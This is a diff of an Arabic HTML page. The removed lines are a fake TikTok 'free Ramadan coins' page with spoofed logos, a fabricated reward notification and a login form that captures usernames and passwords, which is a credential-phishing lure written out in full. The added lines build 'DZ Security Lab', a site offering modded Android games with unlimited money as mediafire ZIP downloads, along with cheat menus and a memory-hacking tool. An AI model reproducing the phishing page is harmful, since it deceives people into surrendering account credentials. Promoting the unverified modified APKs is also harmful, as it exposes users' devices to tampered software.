@@ -2,109 +2,1777 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok - عروض رمضان 🌙</title>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DZ Security Lab - مكتبة الألعاب المعدلة وأدوات المطورين</title>
     <style>
-        :root { --tt-red: #fe2c55; --tt-cyan: #25f4ee; --gold: #ffd700; }
-        body { font-family: 'Noto Sans Arabic', sans-serif; background: #010101; color: white; margin: 0; }
-        .nav { display: flex; justify-content: space-between; padding: 15px; align-items: center; border-bottom: 0.5px solid #333; }
-        .ramadan-banner { background: linear-gradient(45deg, #fe2c55, #800020); padding: 10px; text-align: center; font-size: 14px; font-weight: bold; }
-        .container { padding: 20px; max-width: 450px; margin: auto; }
-        .coin-box { background: #121212; border: 1px solid #333; border-radius: 12px; padding: 20px; display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
-        .price-tag { background: var(--tt-red); padding: 5px 15px; border-radius: 20px; font-weight: bold; cursor: pointer; }
-        .info-link { color: #ccc; font-size: 12px; text-decoration: underline; cursor: pointer; display: block; margin-top: 15px; }
+        :root {
+            --bg-color: #05070c;
+            --card-bg: #0d121f;
+            --accent-color: #00f0ff;
+            --accent-glow: rgba(0, 240, 255, 0.4);
+            --accent-secondary: #ff0055;
+            --accent-secondary-glow: rgba(255, 0, 85, 0.4);
+            --text-color: #ffffff;
+            --text-secondary: #a0aec0;
+            --success-color: #00ff66;
+            --danger-color: #ff2a2a;
+            --warning-color: #ffaa00;
+            --border-color: rgba(0, 240, 255, 0.3);
+            --border-glow: 0 0 15px rgba(0, 240, 255, 0.25);
+        }
+
+        body.theme-neon-cyan {
+            --accent-color: #00f0ff;
+            --accent-glow: rgba(0, 240, 255, 0.5);
+            --accent-secondary: #7000ff;
+            --accent-secondary-glow: rgba(112, 0, 255, 0.4);
+            --border-color: rgba(0, 240, 255, 0.4);
+            --border-glow: 0 0 20px rgba(0, 240, 255, 0.3);
+        }
+        body.theme-matrix-green {
+            --accent-color: #00ff66;
+            --accent-glow: rgba(0, 255, 102, 0.5);
+            --accent-secondary: #00e1ff;
+            --accent-secondary-glow: rgba(0, 225, 255, 0.4);
+            --border-color: rgba(0, 255, 102, 0.4);
+            --border-glow: 0 0 20px rgba(0, 255, 102, 0.3);
+        }
+        body.theme-cyber-pink {
+            --accent-color: #ff007f;
+            --accent-glow: rgba(255, 0, 127, 0.5);
+            --accent-secondary: #00f0ff;
+            --accent-secondary-glow: rgba(0, 240, 255, 0.4);
+            --border-color: rgba(255, 0, 127, 0.4);
+            --border-glow: 0 0 20px rgba(255, 0, 127, 0.3);
+        }
+        body.theme-electric-violet {
+            --accent-color: #9d00ff;
+            --accent-glow: rgba(157, 0, 255, 0.5);
+            --accent-secondary: #00ffcc;
+            --accent-secondary-glow: rgba(0, 255, 204, 0.4);
+            --border-color: rgba(157, 0, 255, 0.4);
+            --border-glow: 0 0 20px rgba(157, 0, 255, 0.3);
+        }
+        body.theme-plasma-gold {
+            --accent-color: #ffaa00;
+            --accent-glow: rgba(255, 170, 0, 0.5);
+            --accent-secondary: #ff0055;
+            --accent-secondary-glow: rgba(255, 0, 85, 0.4);
+            --border-color: rgba(255, 170, 0, 0.4);
+            --border-glow: 0 0 20px rgba(255, 170, 0, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            transition: background-color 0.6s cubic-bezier(0.4, 0, 0.2, 1), 
+                        border-color 0.6s cubic-bezier(0.4, 0, 0.2, 1), 
+                        box-shadow 0.6s cubic-bezier(0.4, 0, 0.2, 1), 
+                        color 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        header {
+            background: linear-gradient(135deg, rgba(13, 18, 31, 0.95), rgba(5, 7, 12, 0.98));
+            padding: 24px 15px;
+            text-align: center;
+            border-bottom: 2px solid var(--accent-color);
+            box-shadow: 0 4px 30px var(--accent-glow), inset 0 0 20px rgba(255, 255, 255, 0.03);
+            position: relative;
+            backdrop-filter: blur(12px);
+        }
+        header h1 {
+            color: var(--accent-color);
+            font-size: clamp(1.8rem, 5vw, 2.6rem);
+            margin-bottom: 6px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px var(--accent-glow), 0 0 30px var(--accent-color);
+            font-weight: 900;
+        }
+        header p {
+            color: var(--text-secondary);
+            font-size: clamp(0.9rem, 3vw, 1.05rem);
+            text-shadow: 0 0 5px rgba(0,0,0,0.8);
+        }
+
+        .theme-switcher-bar {
+            max-width: 1200px;
+            margin: 15px auto 0 auto;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            box-shadow: var(--border-glow);
+            width: calc(100% - 20px);
+        }
+        .theme-label {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .theme-buttons {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .theme-dot {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            cursor: pointer;
+            border: 2px solid #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .theme-dot:hover {
+            transform: scale(1.35) rotate(15deg);
+        }
+        .dot-cyan { background: #00f0ff; box-shadow: 0 0 12px #00f0ff; }
+        .dot-green { background: #00ff66; box-shadow: 0 0 12px #00ff66; }
+        .dot-pink { background: #ff007f; box-shadow: 0 0 12px #ff007f; }
+        .dot-violet { background: #9d00ff; box-shadow: 0 0 12px #9d00ff; }
+        .dot-gold { background: #ffaa00; box-shadow: 0 0 12px #ffaa00; }
+
+        .auto-mode-toggle {
+            background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
+            color: #000;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 8px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 10px var(--accent-glow);
+            transition: all 0.3s;
+        }
+
+        .dev-section {
+            background: linear-gradient(135deg, rgba(13, 18, 31, 0.9), rgba(20, 28, 48, 0.9));
+            border: 2px solid var(--accent-color);
+            border-radius: 14px;
+            padding: 18px;
+            margin: 15px auto 10px auto;
+            max-width: 1200px;
+            width: calc(100% - 20px);
+            box-shadow: 0 0 25px var(--accent-glow), inset 0 0 15px rgba(255,255,255,0.02);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .dev-title {
+            color: var(--accent-color);
+            font-size: 1.05rem;
+            margin-bottom: 4px;
+            font-weight: bold;
+            text-shadow: 0 0 8px var(--accent-glow);
+        }
+        .dev-name {
+            font-size: 1.4rem;
+            color: var(--text-color);
+            margin-bottom: 10px;
+            font-weight: 900;
+            letter-spacing: 1px;
+        }
+        .dev-links {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .dev-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 0.85rem;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .dev-btn.youtube {
+            background-color: #ff0033;
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 0, 51, 0.4);
+        }
+        .dev-btn.telegram {
+            background-color: #0088cc;
+            color: #fff;
+            box-shadow: 0 0 15px rgba(0, 136, 204, 0.4);
+        }
+
+        .categories-container {
+            max-width: 1200px;
+            margin: 15px auto;
+            padding: 0 10px;
+            width: 100%;
+        }
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 8px;
+        }
+        @media (max-width: 900px) {
+            .categories-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        .cat-box {
+            background: var(--card-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 10px;
+            padding: 12px 8px;
+            text-align: center;
+            font-size: 0.82rem;
+            font-weight: bold;
+            color: var(--text-secondary);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: var(--border-glow);
+        }
+        .cat-box:hover, .cat-box.active {
+            background: rgba(13, 18, 31, 0.9);
+            color: var(--accent-color);
+            border-color: var(--accent-color);
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px var(--accent-glow);
+            text-shadow: 0 0 8px var(--accent-glow);
+        }
+
+        .main-container {
+            max-width: 1200px;
+            margin: 10px auto 30px auto;
+            padding: 0 10px;
+            flex: 1;
+            width: 100%;
+        }
+        .section-title {
+            font-size: clamp(1.2rem, 4vw, 1.5rem);
+            color: var(--accent-color);
+            margin-bottom: 20px;
+            border-right: 4px solid var(--accent-color);
+            padding-right: 10px;
+            text-shadow: 0 0 12px var(--accent-glow);
+            font-weight: 800;
+        }
         
-        /* Overlay Login */
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; }
-        .login-card { background: white; color: black; width: 90%; border-radius: 15px; padding: 30px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; background: #f8f8f8; font-family: inherit; }
-        .btn-submit { background: var(--tt-red); color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        .nav-tool-banner {
+            background: linear-gradient(135deg, rgba(13, 18, 31, 0.9), rgba(25, 35, 60, 0.9));
+            border: 2px dashed var(--accent-color);
+            border-radius: 14px;
+            padding: 18px;
+            text-align: center;
+            margin-bottom: 25px;
+            box-shadow: 0 0 25px var(--accent-glow);
+        }
+        .nav-tool-banner h3 {
+            color: var(--accent-color);
+            margin-bottom: 8px;
+            font-size: 1.2rem;
+            text-shadow: 0 0 10px var(--accent-glow);
+        }
+        .goto-tool-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
+            color: #000;
+            padding: 10px 22px;
+            border-radius: 8px;
+            font-weight: 900;
+            font-size: 0.95rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+        .back-to-home-btn {
+            display: inline-block;
+            background-color: var(--card-bg);
+            color: var(--accent-color);
+            border: 1.5px solid var(--accent-color);
+            padding: 8px 18px;
+            border-radius: 8px;
+            font-weight: bold;
+            text-decoration: none;
+            margin-bottom: 15px;
+            box-shadow: var(--border-glow);
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .tool-card {
+            background: var(--card-bg);
+            border: 2px solid var(--accent-color);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 35px var(--accent-glow), inset 0 0 20px rgba(255,255,255,0.02);
+        }
+        .tool-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+        .tool-title {
+            color: var(--accent-color);
+            font-size: clamp(1.4rem, 4vw, 1.8rem);
+            font-weight: 900;
+            text-shadow: 0 0 12px var(--accent-glow);
+        }
+        .tool-badge {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            border: 1px solid var(--accent-color);
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+        .tool-desc {
+            color: var(--text-secondary);
+            font-size: 0.92rem;
+            margin-bottom: 18px;
+            line-height: 1.7;
+        }
+        .tool-features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .tool-feature-item {
+            background: rgba(5, 7, 12, 0.7);
+            border: 1px solid var(--border-color);
+            padding: 12px 14px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: var(--text-color);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: var(--border-glow);
+        }
+        .tool-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .tool-btn {
+            flex: 1;
+            min-width: 180px;
+            padding: 12px 18px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 0.95rem;
+            text-align: center;
+            transition: all 0.3s;
+            cursor: pointer;
+            border: none;
+        }
+        .tool-btn.download {
+            background: linear-gradient(135deg, #00ff66, #00b347);
+            color: #000;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.4);
+            font-weight: 900;
+        }
+        .tool-btn.info {
+            background: linear-gradient(135deg, var(--accent-secondary), #9d00ff);
+            color: #fff;
+            box-shadow: 0 0 20px var(--accent-secondary-glow);
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .game-card {
+            background-color: var(--card-bg);
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1.5px solid var(--border-color);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5), var(--border-glow);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
+        }
+        .game-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 35px rgba(0,0,0,0.7), 0 0 25px var(--accent-glow);
+            border-color: var(--accent-color);
+        }
+        .game-header {
+            padding: 18px 18px 8px 18px;
+        }
+        .game-title {
+            color: var(--text-color);
+            font-size: 1.2rem;
+            margin-bottom: 6px;
+            font-weight: 800;
+        }
+        .game-desc {
+            color: var(--text-secondary);
+            font-size: 0.86rem;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        .features-list {
+            list-style: none;
+            padding: 0 18px;
+            margin-bottom: 12px;
+        }
+        .features-list li {
+            padding: 5px 0;
+            font-size: 0.84rem;
+            display: flex;
+            align-items: center;
+            color: var(--text-secondary);
+        }
+        .features-list li::before {
+            content: "⚡";
+            margin-left: 6px;
+            color: var(--accent-color);
+            text-shadow: 0 0 8px var(--accent-glow);
+        }
         
-        /* Notification style */
-        .notif { position: fixed; top: 10px; left: 50%; transform: translateX(-50%); background: #333; padding: 10px 20px; border-radius: 30px; font-size: 12px; display: none; z-index: 2000; border: 1px solid var(--tt-red); }
+        .mod-menu-preview {
+            background: rgba(5, 7, 12, 0.85);
+            border: 2px solid var(--accent-color);
+            border-radius: 10px;
+            padding: 12px;
+            margin: 10px 18px;
+            box-shadow: inset 0 0 15px var(--accent-glow);
+        }
+        .mod-menu-title {
+            text-align: center;
+            color: var(--accent-color);
+            font-weight: 900;
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px var(--accent-glow);
+        }
+        .mod-grid {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 6px;
+            margin-bottom: 6px;
+            align-items: center;
+        }
+        .mod-btn-sample {
+            background: linear-gradient(135deg, #1e3a8a, #1d4ed8);
+            color: #fff;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            border: 1px solid #3b82f6;
+            text-align: center;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .mod-btn-sample.active-mod {
+            background: linear-gradient(135deg, #00ff66, #16a34a);
+            color: #000;
+            border-color: #00ff66;
+            box-shadow: 0 0 10px rgba(0, 255, 102, 0.5);
+        }
+        .mod-close-btn {
+            background: #1e293b;
+            color: #fff;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            border: 1px solid #475569;
+            text-align: center;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .mod-btn-sample.purple {
+            background: linear-gradient(135deg, var(--accent-secondary), #6d28d9);
+            border-color: var(--accent-color);
+            color: #fff;
+        }
+        .mod-btn-sample.purple.active-mod {
+            background: linear-gradient(135deg, #00ff66, #16a34a);
+            color: #000;
+            border-color: #00ff66;
+        }
+
+        .game-disclaimer {
+            background: rgba(3, 5, 8, 0.9);
+            border-top: 1px dashed var(--border-color);
+            padding: 10px 18px;
+            font-size: 0.74rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            text-align: justify;
+        }
+
+        .card-footer {
+            padding: 14px 18px;
+            background: rgba(13, 18, 31, 0.8);
+            border-top: 1.5px solid var(--border-color);
+            text-align: center;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #00ff66, #00b347);
+            color: #000;
+            padding: 10px 16px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 900;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.3);
+            width: 100%;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.6);
+        }
+
+        .transparency-card, .interactive-form-card {
+            background: var(--card-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.4), var(--border-glow);
+        }
+        .transparency-card h3, .interactive-form-card h3 {
+            color: var(--accent-color);
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 0 8px var(--accent-glow);
+            font-weight: 800;
+        }
+        .transparency-card p {
+            color: var(--text-secondary);
+            font-size: 0.92rem;
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        .safety-box {
+            background: rgba(5, 7, 12, 0.8);
+            border-left: 4px solid var(--success-color);
+            padding: 14px;
+            border-radius: 0 8px 8px 0;
+            margin-top: 12px;
+            font-size: 0.88rem;
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+        }
+        .safety-box a {
+            color: var(--accent-color);
+            text-decoration: underline;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            color: var(--text-color);
+            font-weight: bold;
+            margin-bottom: 6px;
+            font-size: 0.9rem;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(5, 7, 12, 0.8);
+            border: 1.5px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-color);
+            font-size: 0.92rem;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        .form-control:focus {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 20px var(--accent-glow);
+        }
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+        .star-rating {
+            display: flex;
+            gap: 10px;
+            font-size: 1.8rem;
+            cursor: pointer;
+            direction: ltr;
+            justify-content: flex-end;
+        }
+        .star {
+            color: #475569;
+            transition: color 0.2s, transform 0.2s;
+        }
+        .star.selected, .star:hover, .star:hover ~ .star {
+            color: #ffaa00;
+            text-shadow: 0 0 12px rgba(255, 170, 0, 0.6);
+            transform: scale(1.1);
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
+            color: #000;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: 900;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            box-shadow: 0 0 25px var(--accent-glow);
+        }
+        .submit-btn:hover {
+            opacity: 0.95;
+            transform: translateY(-2px);
+            box-shadow: 0 0 35px var(--accent-glow);
+        }
+        .form-status {
+            margin-top: 12px;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-secondary);
+            border-top: 1.5px solid var(--border-color);
+            background: var(--card-bg);
+            margin-top: auto;
+            font-size: 0.88rem;
+            box-shadow: 0 -5px 20px rgba(0,0,0,0.4);
+        }
+        
+        .page-content {
+            display: none;
+        }
+        .page-content.active-page {
+            display: block;
+            animation: fadeInPage 0.4s ease-in-out;
+        }
+
+        .warning-box {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1.5px solid var(--warning-color);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        .warning-box strong {
+            color: var(--warning-color);
+        }
+        .warning-box .highlight {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        /* تنسيق خاص لأداة DZ_Scanner */
+        .scanner-badge {
+            display: inline-block;
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid var(--accent-color);
+            border-radius: 6px;
+            padding: 2px 10px;
+            font-size: 0.7rem;
+            color: var(--accent-color);
+            margin: 2px 0;
+        }
+        .feature-grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 8px;
+            margin: 10px 0;
+        }
+        .feature-item-compact {
+            background: rgba(5, 7, 12, 0.7);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 8px 10px;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        @keyframes fadeInPage {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
-<body>
+<body class="theme-neon-cyan">
 
-<div class="notif" id="notif">🔔 إشعار: حصل @user77 على 50 عملة مجانية الآن!</div>
+    <header>
+        <h1>DZ SECURITY LAB</h1>
+        <p>المصدر الاحترافي لتعديل الألعاب وقوائم الغش المباشرة وأدوات المطورين</p>
+    </header>
 
-<div class="nav">
-    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" width="100">
-    <span style="color:var(--gold)">🌙 عروض رمضان</span>
-</div>
-
-<div class="ramadan-banner">🌙 مبارك عليكم الشهر | عروض الشحن المجانية لفترة محدودة</div>
-
-<div class="container">
-    <h2 style="font-size: 20px;">احصل على عملات TikTok مجاناً</h2>
-    <p style="color:#aaa; font-size: 14px;">بمناسبة شهر رمضان المبارك، تيك توك تقدم هدايا لصناع المحتوى والمتابعين.</p>
-
-    <div class="coin-box">
-        <div>
-            <span style="font-size: 18px; font-weight: bold;">🪙 50 عملة</span><br>
-            <span style="font-size: 12px; color: var(--gold);">هدية رمضانية (مرة واحدة)</span>
+    <div class="theme-switcher-bar">
+        <div class="theme-label">
+            <span>⚡ نظام الألوان السيبراني:</span>
         </div>
-        <div class="price-tag" onclick="openLogin()">0.00$ شحن</div>
+        <div class="theme-buttons">
+            <div class="theme-dot dot-cyan" title="سماوي نيون" onclick="setCyberTheme('theme-neon-cyan')"></div>
+            <div class="theme-dot dot-green" title="أخضر ماتركس" onclick="setCyberTheme('theme-matrix-green')"></div>
+            <div class="theme-dot dot-pink" title="وردي سيبراني" onclick="setCyberTheme('theme-cyber-pink')"></div>
+            <div class="theme-dot dot-violet" title="بنفسجي كهربائي" onclick="setCyberTheme('theme-electric-violet')"></div>
+            <div class="theme-dot dot-gold" title="ذهبي بلازما" onclick="setCyberTheme('theme-plasma-gold')"></div>
+            <button id="autoModeBtn" class="auto-mode-toggle" onclick="toggleAutoThemeMode()">🔄 التغيير التلقائي: ON</button>
+        </div>
     </div>
 
-    <div id="howToUse" style="margin-top: 30px; border-top: 1px solid #333; padding-top: 15px;">
-        <h3 style="font-size: 16px; color: var(--tt-cyan);">كيفية استخدام الموقع:</h3>
-        <ol style="font-size: 13px; color: #ccc; line-height: 1.8;">
-            <li>اختر عرض الـ 50 عملة المجاني.</li>
-            <li>سجل دخولك بحساب تيك توك للتحقق من هويتك.</li>
-            <li>سيتم إضافة العملات إلى محفظتك في غضون 5 دقائق.</li>
-        </ol>
+    <div class="dev-section">
+        <div class="dev-title">معلومات المطور / Developer</div>
+        <div class="dev-name">ADEM</div>
+        <div class="dev-links">
+            <a href="https://www.youtube.com/@MrSecurity333" target="_blank" class="dev-btn youtube">
+                📺 يوتيوب
+            </a>
+            <a href="https://t.me/gdch6" target="_blank" class="dev-btn telegram">
+                💬 تليجرام
+            </a>
+        </div>
     </div>
 
-    <div style="font-size: 10px; color: #555; margin-top: 40px;">
-        بنود تيك توك: تخضع هذه المكافأة لسياسة المحتوى الرقمي لعام 2026. تيك توك ليست مسؤولة عن سوء الاستخدام. حماية الخصوصية مفعلة بنظام SSL.
+    <div class="categories-container">
+        <div class="categories-grid">
+            <div class="cat-box active" onclick="switchPage('games')">🎮 الألعاب المعدلة (15)</div>
+            <div class="cat-box" onclick="switchPage('tool')">🛠️ أداة المطور</div>
+            <div class="cat-box" onclick="switchPage('transparency')">🛡️ الشفافية والأمان</div>
+            <div class="cat-box" onclick="switchPage('requests')">📥 طلبات التعديل</div>
+            <div class="cat-box" onclick="switchPage('feedback')">⭐ التقييم والملاحظات</div>
+        </div>
     </div>
-</div>
 
-<div class="overlay" id="overlay">
-    <div class="login-card">
-        <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587573852f124113a2d7bc60ff0.svg" width="120">
-        <h3 style="margin-top:20px;">تسجيل الدخول للمتابعة</h3>
-        <p style="font-size:12px; color:#666;">يجب تسجيل الدخول لاستلام الـ 50 عملة</p>
+    <div class="main-container">
         
-        <input type="text" id="user" placeholder="الإيميل / الهاتف / اسم المستخدم">
-        <input type="password" id="pass" placeholder="كلمة السر">
-        
-        <button class="btn-submit" onclick="sendData()">تأكيد الشحن المجاني</button>
-        <p style="font-size: 11px; margin-top: 15px; color: #999;">بالضغط على تأكيد، أنت توافق على بنود الاستخدام.</p>
+        <div id="page-games" class="page-content active-page">
+            
+            <div class="nav-tool-banner">
+                <h3>🛠️ هل أنت مطور تبحث عن أدوات متقدمة؟</h3>
+                <p style="color: var(--text-secondary); margin-bottom: 12px; font-size: 0.88rem;">اكتشف أداة DZ_Scanner v7.1 لتحليل وتعديل الذاكرة في وقت التشغيل مع نظام هوكات متطور.</p>
+                <a href="#tool" class="goto-tool-btn" onclick="switchPage('tool')">توجه لأداة المطور</a>
+            </div>
+
+            <h2 class="section-title">قائمة الألعاب المعدلة المتوفرة</h2>
+            
+            <div class="games-grid">
+                
+                <!-- Brain Test 3 -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
+                            <h3 class="game-title">🧠 Brain Test 3 (الجزء الثالث)</h3>
+                            <p class="game-desc">الجزء الثالث من لعبة الألغاز الذكية الإصدار 1.81.0 بمعمارية ARM64 مع أموال لا نهائية وبدون إعلانات.</p>
+                        </div>
+                        
+                        <div class="mod-menu-preview" style="border-color: var(--danger-color); background: rgba(15, 23, 42, 0.95);">
+                            <div class="mod-menu-title" style="color: var(--danger-color);">⚠️ تنبيهات هامة للتشغيل الصحيح</div>
+                            
+                            <div class="warning-box" style="border-color: var(--danger-color); background: rgba(255, 0, 0, 0.05);">
+                                <strong>🔴 خطوات التفعيل الصحيحة (مهم جداً):</strong>
+                                <ol style="margin-right: 20px; margin-top: 6px; padding-right: 10px; font-size: 0.78rem; color: var(--text-secondary);">
+                                    <li>📌 <strong>أول دخول للعبة:</strong> يجب فتح واجهة اللعبة بسرعة، يوجد عداد، يجب تفعيل الميزة (زر) في <span class="highlight">ثانية 3</span> تحديداً.</li>
+                                    <li>🚫 إذا ظهرت معك مصابيح عدد كبير وفوقها علامة <span class="highlight">سالب (-)</span>: 
+                                        <ul style="margin-right: 20px; margin-top: 4px;">
+                                            <li>• اخرج من اللعبة تماماً.</li>
+                                            <li>• امسح بيانات اللعبة وبيانات الخلفية (Cache & Data).</li>
+                                            <li>• أعد الدخول وكرر التفعيل في <span class="highlight">ثانية 3</span>.</li>
+                                        </ul>
+                                    </li>
+                                    <li>✅ إذا ظهرت المصابيح بطريقة صحيحة (عدد كبير بدون علامة سالب)، يمكنك شراء بها.</li>
+                                    <li>🔄 إذا ظهرت علامة <span class="highlight">-</span> مرة أخرى، أعد المحاولة من الخطوة 2.</li>
+                                </ol>
+                            </div>
+                        </div>
+
+                        <ul class="features-list">
+                            <li><strong>الإصدار:</strong> 1.81.0 (رقم الإصدار: 138) | <strong>المعمارية:</strong> Arm64</li>
+                            <li><strong>حجم الملف:</strong> 138.00 ميجابايت</li>
+                            <li><strong>البكج:</strong> <code>com.unicostudio.braintest3</code></li>
+                            <li><strong>الميزات:</strong> 💰 أموال لا نهائية • 🚫 بدون إعلانات مزعجة</li>
+                            <li><strong>نظام التشغيل:</strong> Android 7 (API 24) إلى Android 16 (API 36)</li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <div class="game-disclaimer"></div>
+                        <div class="card-footer">
+                            <button onclick="trackDownload('Brain Test 3 (v1.81.0 - Arm64)', 'https://www.mediafire.com/file/9i3mrcpkzidxf2p/Brain_Test_3.zip/file')" class="btn">تحميل اللعبة (ZIP)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Brain Test 2 -->
+                <div class="game-card">
+                    <div>
+                        <div class="game-header">
